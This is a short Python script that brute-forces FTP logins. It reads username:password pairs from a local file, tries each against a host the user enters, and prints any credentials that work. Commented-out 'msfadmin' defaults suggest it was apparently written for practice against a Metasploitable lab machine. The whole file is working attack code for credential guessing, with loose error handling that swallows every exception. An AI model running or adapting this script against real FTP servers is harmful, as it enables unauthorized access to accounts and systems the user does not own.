#!/usr/bin/python3

import ftplib

hostname = input("enter the host name : ")

def connect(hostname):
	#username = "msfadmin"
	#password = "msfadmin"
	try:

		ftp = ftplib.FTP(hostname)
		data = ftp.login(username,password)
		print("login success")
		print(username,"/",password)
		ftp.quit()
		return(username,password)
	except:
		print("error occured")

f = open("local.txt","r")
for line in f.readlines():
	#line = line.strip("\n")
#	print(line)
	username = line.split(':')[0]
	password = line.split(':')[1].strip("\n")

	#print(username,",",password)
	connect(hostname)
